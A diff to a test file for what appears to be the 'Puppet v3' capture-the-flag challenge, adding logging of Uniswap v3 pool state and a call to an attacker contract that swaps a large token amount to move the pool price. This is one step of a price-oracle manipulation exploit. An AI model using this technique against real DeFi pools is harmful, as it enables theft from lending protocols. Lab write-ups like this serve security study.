@@ -219,6 +219,24 @@ describe("[Challenge] Puppet v3", function () {
       "\nZero for One: false - Swapping token for Weth...",
       "\n____________________________________________________"
     );
+    /** Step2: swapping with time increments */
+
+    console.log(
+      "current liquidity before swap",
+      (await uniswapPool.liquidity()).toString()
+    );
+    console.log(
+      "current slot0 sqrtpricex96 before swap",
+      (await uniswapPool.slot0())[0].toString()
+    );
+    console.log(
+      "current slot0 tick before swap",
+      (await uniswapPool.slot0())[1].toString()
+    );
+
+    await puppetV3Attacker.callSwap(ethers.utils.parseEther("109"), {
+      gasLimit: 3000000,
+    });
   });
 
   after(async function () {
